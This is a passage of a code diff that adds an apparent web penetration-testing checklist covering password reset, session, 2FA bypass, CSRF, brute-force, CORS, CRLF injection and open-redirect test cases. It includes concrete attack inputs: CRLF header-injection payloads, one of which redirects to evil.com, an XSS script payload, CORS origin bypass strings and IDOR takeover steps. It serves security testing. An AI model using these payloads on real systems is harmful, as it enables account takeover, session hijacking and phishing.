+        \`password-reset-flaw\` · \`predictable-token\`
+
+        ## Description
+
+        Test whether reset tokens are predictable and can be brute-forced.
+
+        ## Sequential Tokens
+
+        \`token001\`, \`token002\`, \`token003\` → can be brute-forced.
+
+        ## Short Tokens
+
+        \`abc123\` or \`qwerty\` → easily brute-forced.
+
+        ## Predictable Patterns
+
+        \`userID_timestamp\` → easily guessable.
+
+        ## Static Tokens
+
+        Fixed token for all reset requests.
+
+        ## Expected Result
+
+        Tokens should be cryptographically random and long enough.
+
+        ## Security Impact
+
+        High – token brute-force leads to account takeover.
+        `
+        }, {
+            id: 12,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Reset Token Encoding/Decoding',
+            markdown: `# Test Case 12 – Reset Token Encoding/Decoding
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`token-encoding\`
+
+        ## Description
+
+        Test whether reset tokens are encoded in a predictable way.
+
+        ## Steps
+
+        1. Observe reset token link (it's encoded).
+        2. Decode it using Base64, MD5, etc.
+        3. If easily guessable, modify and encode.
+        4. Use modified token for reset.
+
+        ## Expected Result
+
+        Tokens should not be based on reversible encoding.
+
+        ## Security Impact
+
+        High – token manipulation leads to account takeover.
+        `
+        }, {
+            id: 13,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Email Change After Reset Request',
+            markdown: `# Test Case 13 – Email Change After Reset Request
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`logic-flaw\`
+
+        ## Description
+
+        Test whether an old reset link remains valid after the email is changed.
+
+        ## Steps
+
+        1. Request password reset – get link.
+        2. Don't open reset link.
+        3. Login and change account email.
+        4. Use old reset link.
+        5. If it works → vulnerable.
+
+        ## Expected Result
+
+        Reset links should be invalidated when the account email changes.
+
+        ## Security Impact
+
+        High – allows account takeover after email change.
+        `
+        }, {
+            id: 14,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Reset After Email Update',
+            markdown: `# Test Case 14 – Reset After Email Update
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`logic-flaw\`
+
+        ## Description
+
+        Test whether an old reset link works after email update.
+
+        ## Steps
+
+        1. Request password reset – get link.
+        2. Use link to set new password.
+        3. Update account email.
+        4. Try old reset link.
+        5. If it works → vulnerable.
+
+        ## Expected Result
+
+        Reset links should be invalidated after email update.
+
+        ## Security Impact
+
+        High – allows password reset on changed email.
+        `
+        }, {
+            id: 15,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Time-Based Token Manipulation',
+            markdown: `# Test Case 15 – Time-Based Token Manipulation
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`token-manipulation\`
+
+        ## Description
+
+        Test whether time-based tokens can be manipulated to extend expiration.
+
+        ## Steps
+
+        1. Get reset token with timestamp.
+        2. Decode the token.
+        3. Modify expiration time.
+        4. Encode and reuse.
+        5. If it works → vulnerable.
+
+        ## Expected Result
+
+        Tokens should not be based on client-supplied timestamps.
+
+        ## Security Impact
+
+        High – token replay beyond expiration.
+        `
+        }, {
+            id: 16,
+            category: 'Password Reset Flaw',
+            bugType: 'password-reset-flaw',
+            title: 'Cross-Account Reset via Email Parameter',
+            markdown: `# Test Case 16 – Cross-Account Reset via Email Parameter
+
+        ## Bug Type
+
+        \`password-reset-flaw\` · \`idor\`
+
+        ## Description
+
+        Test whether the email parameter can be changed to reset another user's password.
+
+        ## Steps
+
+        1. Enter attacker's email for reset.
+        2. Get link to attacker's email.
+        3. Intercept the reset request.
+        4. Change email to victim's email.
+        5. Reset victim's password.
+
+        ## Expected Result
+
+        The email parameter should be bound to the session/token.
+
+        ## Security Impact
+
+        Critical – allows password reset of any account.
+        `
+        }, {
+            id: 17,
+            category: 'Session Management',
+            bugType: 'session-mgmt',
+            title: 'Invalid Session After Logout',
+            markdown: `# Test Case 17 – Invalid Session After Logout
+
+        ## Bug Type
+
+        \`session-mgmt\` · \`session-invalidation\`
+
+        ## Description
+
+        Test whether sessions are properly invalidated after logout.
+
+        ## Steps
+
+        1. Login in two different browsers.
+        2. From Browser 1, logout using "Log Out From All Devices".
+        3. Check Browser 2 – can you still perform actions?
+        4. If yes → vulnerable.
+
+        ## Expected Result
+
+        All sessions should be invalidated when logging out from all devices.
+
+        ## Security Impact
+
+        High – session persistence after logout.
+        `
+        }, {
+            id: 18,
+            category: 'Session Management',
+            bugType: 'session-mgmt',
+            title: 'Invalid Session After Password Reset',
+            markdown: `# Test Case 18 – Invalid Session After Password Reset
+
+        ## Bug Type
+
+        \`session-mgmt\` · \`session-invalidation\`
+
+        ## Description
+
+        Test whether sessions are invalidated after a password change.
+
+        ## Steps
+
+        1. Login in two different browsers.
+        2. In Browser 1, change password.
+        3. Check Browser 2 – can you still perform actions?
+        4. If yes → vulnerable.
+
+        ## Expected Result
+
+        All sessions should be invalidated after password change.
+
+        ## Security Impact
+
+        High – session persistence after credential change.
+        `
+        }, {
+            id: 19,
+            category: 'Session Management',
+            bugType: 'session-mgmt',
+            title: 'Session Cookie Reuse',
+            markdown: `# Test Case 19 – Session Cookie Reuse
+
+        ## Bug Type
+
+        \`session-mgmt\` · \`cookie-reuse\`
+
+        ## Description
+
+        Test whether session cookies can be reused after logout or password change.
+
+        ## Steps
+
+        1. Login and copy session cookies.
+        2. Logout or change password.
+        3. Clear browser cookies.
+        4. Paste the copied cookies.
+        5. Refresh page – still logged in?
+
+        ## Expected Result
+
+        Session cookies should be invalidated server-side.
+
+        ## Security Impact
+
+        High – session fixation/replay.
+        `
+        }, {
+            id: 20,
+            category: 'Session Management',
+            bugType: 'session-mgmt',
+            title: '2FA Does Not Expire Previous Sessions',
+            markdown: `# Test Case 20 – 2FA Does Not Expire Previous Sessions
+
+        ## Bug Type
+
+        \`session-mgmt\` · \`2fa-session\`
+
+        ## Description
+
+        Test whether enabling 2FA invalidates existing sessions.
+
+        ## Steps
+
+        1. Login to account.
+        2. Enable 2FA.
+        3. Check if previously active sessions are invalidated.
+
+        ## Expected Result
+
+        All existing sessions should be invalidated when 2FA is enabled.
+
+        ## Security Impact
+
+        Medium – existing sessions remain active after 2FA enable.
+        `
+        }, {
+            id: 21,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Response Manipulation',
+            markdown: `# Test Case 21 – Response Manipulation
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`response-manipulation\`
+
+        ## Description
+
+        Test whether manipulating the server response can bypass 2FA verification.
+
+        ## Steps
+
+        1. Enter wrong OTP.
+        2. Intercept response.
+        3. Change error response to success response.
+        4. Check if OTP is bypassed.
+
+        ## Expected Result
+
+        Server-side verification should not be bypassable by client-side response manipulation.
+
+        ## Security Impact
+
+        High – 2FA bypass via proxy.
+        `
+        }, {
+            id: 22,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Status Code Manipulation',
+            markdown: `# Test Case 22 – Status Code Manipulation
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`status-code-manipulation\`
+
+        ## Description
+
+        Test whether status code manipulation can bypass 2FA.
+
+        ## Steps
+
+        1. Enter wrong OTP.
+        2. Intercept response.
+        3. Change status code: \`403 Forbidden\` → \`200 OK\`
+        4. Check if bypass is successful.
+
+        ## Expected Result
+
+        2FA verification should be enforced server-side.
+
+        ## Security Impact
+
+        High – 2FA bypass via status code tampering.
+        `
+        }, {
+            id: 23,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'OTP Leakage in Response',
+            markdown: `# Test Case 23 – OTP Leakage in Response
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`otp-leak\`
+
+        ## Description
+
+        Test whether the OTP is leaked in the server response.
+
+        ## Steps
+
+        1. Intercept response to OTP verification request.
+        2. Check if actual OTP is returned in response (client-side validation).
+
+        ## Expected Result
+
+        OTPs should never be returned in the response body.
+
+        ## Security Impact
+
+        High – OTP exposure leads to 2FA bypass.
+        `
+        }, {
+            id: 24,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Code Reusability',
+            markdown: `# Test Case 24 – Code Reusability
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`code-reuse\`
+
+        ## Description
+
+        Test whether OTP codes can be reused.
+
+        ## Steps
+
+        1. Enable 2FA on attacker account.
+        2. Logout and login – get OTP.
+        3. Use same OTP twice.
+        4. Also check if previously requested codes expire when new code is requested.
+
+        ## Expected Result
+
+        OTP codes should be single-use and expire after a short time.
+
+        ## Security Impact
+
+        High – OTP replay attacks.
+        `
+        }, {
+            id: 25,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Lack of Rate Limit',
+            markdown: `# Test Case 25 – Lack of Rate Limit
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`rate-limit\`
+
+        ## Description
+
+        Test whether rate limiting is enforced on OTP requests.
+
+        ## Steps
+
+        1. Request 2FA code repeatedly (100–200 times).
+        2. Check if any limitation is set.
+        3. Try to brute-force valid 2FA code.
+        4. Check for successful brute-force.
+
+        ## Expected Result
+
+        Rate limiting should prevent brute-force attacks.
+
+        ## Security Impact
+
+        High – OTP brute-force possible.
+        `
+        }, {
+            id: 26,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'OTP with null or 000000',
+            markdown: `# Test Case 26 – OTP with null or 000000
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`null-bypass\`
+
+        ## Description
+
+        Test whether null or default values bypass 2FA verification.
+
+        ## Steps
+
+        1. Enter \`null\` or \`000000\` as OTP.
+        2. Check if it bypasses 2FA verification.
+
+        ## Expected Result
+
+        The application should reject invalid OTP values.
+
+        ## Security Impact
+
+        High – trivial 2FA bypass.
+        `
+        }, {
+            id: 27,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'CSRF on 2FA Disabling',
+            markdown: `# Test Case 27 – CSRF on 2FA Disabling
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`csrf\`
+
+        ## Description
+
+        Test whether 2FA disabling is vulnerable to CSRF.
+
+        ## Steps
+
+        1. Create CSRF POC for disabling 2FA.
+        2. Send to victim.
+        3. Check if 2FA gets disabled.
+
+        ## Expected Result
+
+        CSRF protection should be enforced on 2FA disabling.
+
+        ## Security Impact
+
+        High – 2FA can be disabled without user consent.
+        `
+        }, {
+            id: 28,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Backup Code Abuse',
+            markdown: `# Test Case 28 – Backup Code Abuse
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`backup-code\`
+
+        ## Description
+
+        Test whether backup codes can be abused.
+
+        ## Steps
+
+        1. Generate backup codes.
+        2. Check if backup codes can be used multiple times.
+        3. Check if backup codes are predictable.
+
+        ## Expected Result
+
+        Backup codes should be single-use and randomly generated.
+
+        ## Security Impact
+
+        Medium – backup code misuse.
+        `
+        }, {
+            id: 29,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Simple 2FA Parameter Manipulation',
+            markdown: `# Test Case 29 – Simple 2FA Parameter Manipulation
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`parameter-manipulation\`
+
+        ## Description
+
+        Test whether 2FA can be bypassed by parameter manipulation.
+
+        ## Steps
+
+        1. Login with attacker credentials.
+        2. Complete 2FA verification.
+        3. Get dashboard link: \`https://example.com/my-account?id=attacker\`
+        4. For victim:
+           - Login with victim credentials.
+           - Instead of 2FA, use: \`https://example.com/my-account?id=victim\`
+        5. If you access victim dashboard → vulnerable.
+
+        ## Expected Result
+
+        2FA should be enforced for all sensitive endpoints.
+
+        ## Security Impact
+
+        High – 2FA bypass via IDOR.
+        `
+        }, {
+            id: 30,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: 'Broken Logic 2FA Bypass',
+            markdown: `# Test Case 30 – Broken Logic 2FA Bypass
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`logic-flaw\`
+
+        ## Description
+
+        Test whether logic flaws allow 2FA bypass.
+
+        ## Steps
+
+        1. Complete 2FA with attacker account.
+        2. Cookie contains: \`verify=attacker\`.
+        3. Change to: \`verify=victim\`.
+        4. Brute-force OTP if needed.
+        5. Access victim account.
+
+        ## Expected Result
+
+        2FA state should be securely bound to the session.
+
+        ## Security Impact
+
+        Critical – full 2FA bypass.
+        `
+        }, {
+            id: 31,
+            category: '2FA Bypass',
+            bugType: '2fa-bypass',
+            title: '2FA Brute-Force via Macro',
+            markdown: `# Test Case 31 – 2FA Brute-Force via Macro
+
+        ## Bug Type
+
+        \`2fa-bypass\` · \`brute-force\`
+
+        ## Description
+
+        Test whether 2FA codes can be brute-forced using automation.
+
+        ## Steps
+
+        1. Login with credentials.
+        2. On OTP page, wrong OTP causes logout.
+        3. Use Burp Macro for automation:
+           - GET login page
+           - POST credentials
+           - GET OTP page
+        4. Brute-force OTP with numeric payload.
+        5. Set min/max length as per OTP length.
+
+        ## Expected Result
+
+        Rate limiting and account lockout should prevent brute-force.
+
+        ## Security Impact
+
+        High – OTP brute-force possible.
+        `
+        }, {
+            id: 32,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Change Request Method',
+            markdown: `# Test Case 32 – CSRF – Change Request Method
+
+        ## Bug Type
+
+        \`csrf\` · \`method-manipulation\`
+
+        ## Description
+
+        Test whether changing the request method bypasses CSRF protection.
+
+        ## Steps
+
+        1. Intercept sensitive request (POST).
+        2. Change method: \`POST\` → \`GET\`.
+        3. Remove CSRF token.
+        4. Generate CSRF POC.
+        5. Send to victim.
+
+        ## Expected Result
+
+        CSRF protection should be method-agnostic and enforced.
+
+        ## Security Impact
+
+        High – CSRF via method manipulation.
+        `
+        }, {
+            id: 33,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Remove Token Parameter',
+            markdown: `# Test Case 33 – CSRF – Remove Token Parameter
+
+        ## Bug Type
+
+        \`csrf\` · \`token-removal\`
+
+        ## Description
+
+        Test whether CSRF protection can be bypassed by removing the token parameter.
+
+        ## Steps
+
+        1. Intercept sensitive request.
+        2. Remove CSRF token parameter.
+        3. Generate CSRF POC.
+        4. Send to victim.
+
+        ## Expected Result
+
+        The server should reject requests without a valid CSRF token.
+
+        ## Security Impact
+
+        High – CSRF token removal bypass.
+        `
+        }, {
+            id: 34,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Use Own Token',
+            markdown: `# Test Case 34 – CSRF – Use Own Token
+
+        ## Bug Type
+
+        \`csrf\` · \`token-reuse\`
+
+        ## Description
+
+        Test whether a CSRF token from one account can be used on another.
+
+        ## Steps
+
+        1. Get CSRF token from your own account.
+        2. Use it in victim's request.
+        3. Check if token is tied to user session.
+
+        ## Expected Result
+
+        CSRF tokens should be session-bound.
+
+        ## Security Impact
+
+        High – cross-account CSRF.
+        `
+        }, {
+            id: 35,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Referrer Bypass',
+            markdown: `# Test Case 35 – CSRF – Referrer Bypass
+
+        ## Bug Type
+
+        \`csrf\` · \`referrer-bypass\`
+
+        ## Description
+
+        Test whether referrer-based CSRF protection can be bypassed.
+
+        ## Methods
+
+        - Change \`Referrer\` to \`Referer\`.
+        - Bypass regex: \`bank.com.attacker.com\` or \`attacker.com/bank.com\`.
+        - Remove referrer header: \`<meta name="referrer" content="no-referrer">\`.
+
+        ## Expected Result
+
+        Referrer validation should be strict and secure.
+
+        ## Security Impact
+
+        High – CSRF via referrer manipulation.
+        `
+        }, {
+            id: 36,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Clickjacking',
+            markdown: `# Test Case 36 – CSRF – Clickjacking
+
+        ## Bug Type
+
+        \`csrf\` · \`clickjacking\`
+
+        ## Description
+
+        Test whether the application is vulnerable to clickjacking.
+
+        ## Steps
+
+        1. Check if page is vulnerable to Clickjacking.
+        2. If yes, overlay sensitive buttons.
+        3. Trick victim into clicking.
+
+        ## Expected Result
+
+        X-Frame-Options or CSP should prevent framing.
+
+        ## Security Impact
+
+        Medium – clickjacking leads to unintended actions.
+        `
+        }, {
+            id: 37,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Delete Account',
+            markdown: `# Test Case 37 – CSRF – Delete Account
+
+        ## Bug Type
+
+        \`csrf\` · \`account-deletion\`
+
+        ## Description
+
+        Test whether account deletion is vulnerable to CSRF.
+
+        ## Steps
+
+        1. Intercept account deletion request.
+        2. Generate CSRF POC using Burp.
+        3. Host HTML on your server.
+        4. Send link to victim.
+        5. Victim's account gets deleted.
+
+        ## Expected Result
+
+        CSRF protection should be enforced on account deletion.
+
+        ## Security Impact
+
+        Critical – account deletion without consent.
+        `
+        }, {
+            id: 38,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Logout',
+            markdown: `# Test Case 38 – CSRF – Logout
+
+        ## Bug Type
+
+        \`csrf\` · \`logout\`
+
+        ## Description
+
+        Test whether logout is vulnerable to CSRF.
+
+        ## Steps
+
+        1. Create CSRF logout POC.
+        2. Send to victim.
+        3. Victim gets logged out.
+
+        ## Expected Result
+
+        CSRF protection should be enforced on logout.
+
+        ## Security Impact
+
+        Low – denial of service via forced logout.
+        `
+        }, {
+            id: 39,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Profile Field Deletion',
+            markdown: `# Test Case 39 – CSRF – Profile Field Deletion
+
+        ## Bug Type
+
+        \`csrf\` · \`profile-modification\`
+
+        ## Description
+
+        Test whether profile field deletion is vulnerable to CSRF.
+
+        ## Steps
+
+        1. Create CSRF form for deleting profile fields.
+        2. Send to admin.
+        3. Profile fields get deleted.
+
+        ## Expected Result
+
+        CSRF protection should be enforced.
+
+        ## Security Impact
+
+        Medium – profile data loss.
+        `
+        }, {
+            id: 40,
+            category: 'CSRF',
+            bugType: 'csrf',
+            title: 'CSRF – Pet/Animal Deletion',
+            markdown: `# Test Case 40 – CSRF – Pet/Animal Deletion
+
+        ## Bug Type
+
+        \`csrf\` · \`data-deletion\`
+
+        ## Description
+
+        Test whether data deletion is vulnerable to CSRF.
+
+        ## Steps
+
+        1. Create CSRF POC for deleting pet.
+        2. Need victim's animal ID.
+        3. Send to victim.
+        4. Pet gets deleted.
+
+        ## Expected Result
+
+        CSRF protection should be enforced.
+
+        ## Security Impact
+
+        Medium – data loss via CSRF.
+        `
+        }, {
+            id: 41,
+            category: 'Brute Force Attacks',
+            bugType: 'brute-force',
+            title: 'Stay-Logged-In Cookie Brute Force',
+            markdown: `# Test Case 41 – Stay-Logged-In Cookie Brute Force
+
+        ## Bug Type
+
+        \`brute-force\` · \`cookie-bruteforce\`
+
+        ## Description
+
+        Test whether "Remember Me" cookies can be brute-forced.
+
+        ## Steps
+
+        1. Login with "Remember Me" enabled.
+        2. Decode cookie (Base64, MD5, etc.).
+        3. Cookie contains username + password.
+        4. Generate cookie with encoded credentials.
+        5. Brute-force victim's credentials.
+
+        ## Expected Result
+
+        Cookies should be cryptographically secure and not reversible.
+
+        ## Security Impact
+
+        High – credential extraction from cookies.
+        `
+        }, {
+            id: 42,
+            category: 'Brute Force Attacks',
+            bugType: 'brute-force',
+            title: 'Password Brute-Force via Password Change',
+            markdown: `# Test Case 42 – Password Brute-Force via Password Change
+
+        ## Bug Type
+
+        \`brute-force\` · \`password-bruteforce\`
+
+        ## Description
+
+        Test whether password change endpoint allows brute-force of current password.
+
+        ## Steps
+
+        1. Login as attacker.
+        2. Go to password change page.
+        3. Intercept change password request.
+        4. Change attacker's ID to victim's ID.
+        5. Brute-force current password.
+        6. Watch for error messages.
+
+        ## Expected Result
+
+        Rate limiting and lockout should prevent brute-force.
+
+        ## Security Impact
+
+        High – password brute-force via IDOR.
+        `
+        }, {
+            id: 43,
+            category: 'Brute Force Attacks',
+            bugType: 'dos',
+            title: 'Long Password DoS Attack',
+            markdown: `# Test Case 43 – Long Password DoS Attack
+
+        ## Bug Type
+
+        \`dos\` · \`long-password\`
+
+        ## Description
+
+        Test whether extremely long passwords cause denial of service.
+
+        ## Steps
+
+        1. Use password of length 150–200 words.
+        2. Check if any length restriction exists.
+        3. If no restriction, use longer password.
+        4. Observe response time.
+        5. Application may crash.
+
+        ## Expected Result
+
+        Password length should be reasonably limited.
+
+        ## Security Impact
+
+        Medium – DoS via resource exhaustion.
+        `
+        }, {
+            id: 44,
+            category: 'Brute Force Attacks',
+            bugType: 'dos',
+            title: 'Permanent Account Lockout',
+            markdown: `# Test Case 44 – Permanent Account Lockout
+
+        ## Bug Type
+
+        \`dos\` · \`account-lockout\`
+
+        ## Description
+
+        Test whether account lockout can lead to permanent denial of service.
+
+        ## Steps
+
+        1. Enter valid email + wrong password.
+        2. Repeat 10–20 times.
+        3. Check if account gets blocked.
+        4. Check blocking time period.
+        5. If permanent or >30 min → vulnerable.
+
+        ## Expected Result
+
+        Account lockout should be temporary and reasonable.
+
+        ## Security Impact
+
+        Medium – permanent DoS via lockout.
+        `
+        }, {
+            id: 45,
+            category: 'Brute Force Attacks',
+            bugType: 'dos',
+            title: 'Long String DoS',
+            markdown: `# Test Case 45 – Long String DoS
+
+        ## Bug Type
+
+        \`dos\` · \`long-string\`
+
+        ## Description
+
+        Test whether long strings in search fields cause DoS.
+
+        ## Steps
+
+        1. Create account with fields (username, address, etc.).
+        2. Input 1000+ characters.
+        3. Search for the account.
+        4. Check for extended search time or crash (500 error).
+
+        ## Expected Result
+
+        Input should be validated and limited.
+
+        ## Security Impact
+
+        Low – DoS via long input.
+        `
+        }, {
+            id: 46,
+            category: 'CORS Misconfiguration',
+            bugType: 'cors',
+            title: 'CORS Origin Reflection',
+            markdown: `# Test Case 46 – CORS Origin Reflection
+
+        ## Bug Type
+
+        \`cors\` · \`origin-reflection\`
+
+        ## Description
+
+        Test whether CORS origin headers are reflected.
+
+        ## Steps
+
+        1. Capture target website traffic.
+        2. Search for \`Access-Control\` headers.
+        3. Add Origin header:
+           - \`Origin: attacker.com\`
+           - \`Origin: null\`
+           - \`Origin: attacker.target.com\`
+           - \`Origin: target.attacker.com\`
+        4. Check if origin is reflected in response.
+
+        ## Expected Result
+
+        CORS should be configured to allow only trusted origins.
+
+        ## Security Impact
+
+        High – cross-origin data theft.
+        `
+        }, {
+            id: 47,
+            category: 'CORS Misconfiguration',
+            bugType: 'cors',
+            title: 'CORS Subdomain Testing',
+            markdown: `# Test Case 47 – CORS Subdomain Testing
+
+        ## Bug Type
+
+        \`cors\` · \`subdomain\`
+
+        ## Description
+
+        Test whether subdomains have permissive CORS.
+
+        ## Steps
+
+        1. Find all subdomains: \`subfinder -d target.com\`.
+        2. Check alive domains: \`httpx\`.
+        3. Test each with Origin header.
+        4. Check for reflected origins.
+
+        ## Expected Result
+
+        Subdomains should also have proper CORS configuration.
+
+        ## Security Impact
+
+        High – cross-origin data theft from subdomains.
+        `
+        }, {
+            id: 48,
+            category: 'CORS Misconfiguration',
+            bugType: 'cors',
+            title: 'CORS Bypass Techniques',
+            markdown: `# Test Case 48 – CORS Bypass Techniques
+
+        ## Bug Type
+
+        \`cors\` · \`bypass\`
+
+        ## Description
+
+        Test various CORS bypass techniques.
+
+        ## Testing
+
+        - \`Origin: null\`
+        - \`Origin: attacker.com\`
+        - \`Origin: attacker.target.com\`
+        - \`Origin: attackertarget.com\`
+        - \`Origin: sub.attackertarget.com\`
+        - Method change: GET ↔ POST
+        - \`Origin: sub.attacker%target.com\`
+        - \`Origin: attacker.com/target.com\`
+
+        ## Expected Result
+
+        Only trusted origins should be allowed.
+
+        ## Security Impact
+
+        High – cross-origin data theft.
+        `
+        }, {
+            id: 49,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Cookie Injection',
+            markdown: `# Test Case 49 – CRLF Injection – Cookie Injection
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`cookie-injection\`
+
+        ## Description
+
+        Test whether CRLF injection can be used to inject cookies.
+
+        ## Example
+
+        \`\`\`http
+        GET /%0d%0aSet-Cookie:CRLFInjection=MaliciousCookieSet HTTP/1.1
+        Host: target.com
+        \`\`\`
+
+        ## Expected Result
+
+        The application should reject CRLF characters in input.
+
+        ## Security Impact
+
+        High – session fixation via cookie injection.
+        `
+        }, {
+            id: 50,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – XSS via Response Splitting',
+            markdown: `# Test Case 50 – CRLF Injection – XSS via Response Splitting
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`xss\`
+
+        ## Description
+
+        Test whether CRLF injection can lead to XSS.
+
+        ## Example
+
+        \`\`\`text
+        https://www.target.com/%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E
+        \`\`\`
+
+        ## Expected Result
+
+        CRLF characters should be sanitized.
+
+        ## Security Impact
+
+        High – XSS via response splitting.
+        `
+        }, {
+            id: 51,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Phishing/Redirect',
+            markdown: `# Test Case 51 – CRLF Injection – Phishing/Redirect
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`phishing\`
+
+        ## Description
+
+        Test whether CRLF injection can be used for phishing redirects.
+
+        ## Example
+
+        \`\`\`http
+        GET /%0d%0aLocation:%20https://evil.com HTTP/1.1
+        Host: target.com
+        \`\`\`
+
+        ## Expected Result
+
+        The application should reject CRLF characters.
+
+        ## Security Impact
+
+        High – phishing via open redirect.
+        `
+        }, {
+            id: 52,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Session Fixation',
+            markdown: `# Test Case 52 – CRLF Injection – Session Fixation
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`session-fixation\`
+
+        ## Description
+
+        Test whether CRLF injection allows session fixation.
+
+        ## Example
+
+        \`\`\`text
+        www.target.com/%0d%0aSet-Cookie:session_id=942...
+        \`\`\`
+
+        ## Expected Result
+
+        CRLF characters should be rejected.
+
+        ## Security Impact
+
+        High – session fixation.
+        `
+        }, {
+            id: 53,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Web Cache Poisoning',
+            markdown: `# Test Case 53 – CRLF Injection – Web Cache Poisoning
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`cache-poisoning\`
+
+        ## Description
+
+        Test whether CRLF injection can poison web caches.
+
+        ## Example
+
+        \`\`\`http
+        GET /%0d%0aX-Forwarded-Host:hacker.com HTTP/1.1
+        Host: target.com
+        \`\`\`
+
+        ## Expected Result
+
+        CRLF characters should be sanitized.
+
+        ## Security Impact
+
+        High – cache poisoning.
+        `
+        }, {
+            id: 54,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Log Injection',
+            markdown: `# Test Case 54 – CRLF Injection – Log Injection
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`log-injection\`
+
+        ## Description
+
+        Test whether CRLF injection can be used for log injection.
+
+        ## Example
+
+        \`\`\`text
+        /index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
+        \`\`\`
+
+        ## Expected Result
+
+        CRLF characters should be sanitized.
+
+        ## Security Impact
+
+        Medium – log forging.
+        `
+        }, {
+            id: 55,
+            category: 'HTTP Response Splitting/CRLF Injection',
+            bugType: 'crlf-injection',
+            title: 'CRLF Injection – Header Injection',
+            markdown: `# Test Case 55 – CRLF Injection – Header Injection
+
+        ## Bug Type
+
+        \`crlf-injection\` · \`header-injection\`
+
+        ## Description
+
+        Test whether CRLF injection allows arbitrary header injection.
+
+        ## Example
+
+        \`\`\`text
+        www.target.com/%0d%0aHackersHeader:NewHeader
+        \`\`\`
+
+        ## Expected Result
+
+        CRLF characters should be rejected.
+
+        ## Security Impact
+
+        High – arbitrary header injection.
+        `
+        }, {
+            id: 56,
+            category: 'Open Redirect',
+            bugType: 'open-redirect',
+            title: 'Open Redirect – Parameter Testing',
+            markdown: `# Test Case 56 – Open Redirect – Parameter Testing
+
+        ## Bug Type
+
+        \`open-redirect\` · \`parameter-manipulation\`
+
+        ## Description
+
+        Test common parameter names for open redirect vulnerabilities.
+
+        ## Parameter Names
+
+        \`\`\`text
+        dest, uri, continue, window, View, show, open, redirect, Path, url, out, to,
+        Dir, navigation, file, reference, Html, data, site, host, Page, port, next,
+        feed, Return, callback, val, doman, Return_url, validate, returnurl,
+        return_to, Currurl, relaystate, successuri, exit_uri
+        \`\`\`
+
+        ## Expected Result
+
+        Redirect parameters should validate the destination.
+
+        ## Security Impact
+
+        Medium – phishing via open redirect.
+        `
+        }, {
+            id: 57,
+            category: 'Open Redirect',
+            bugType: 'open-redirect',
+            title: 'Open Redirect – URL Parameters',
+            markdown: `# Test Case 57 – Open Redirect – URL Parameters
+
+        ## Bug Type
+
+        \`open-redirect\` · \`url-manipulation\`
+
+        ## Description
+
+        Test various URL manipulation techniques for open redirect.
+
+        ## Examples
+
+        \`\`\`text
+        ?url=http://{target}
+        ?url=//{target}
+        ?url=$2f%2f{target}
+        ?url=/{target}
+        ?redirect={target}
+        ?next={target}
+        ?destination={payload}
+        ?returnTo={payload}
+        \`\`\`
+
+        ## Expected Result
+
+        Redirects should be validated against a whitelist.
+
+        ## Security Impact
+
+        Medium – phishing via open redirect.
+        `
+        }, {
+            id: 58,
+            category: 'Open Redirect',
+            bugType: 'open-redirect',
+            title: 'Open Redirect – Login Flow',
+            markdown: `# Test Case 58 – Open Redirect – Login Flow
+
+        ## Bug Type
+
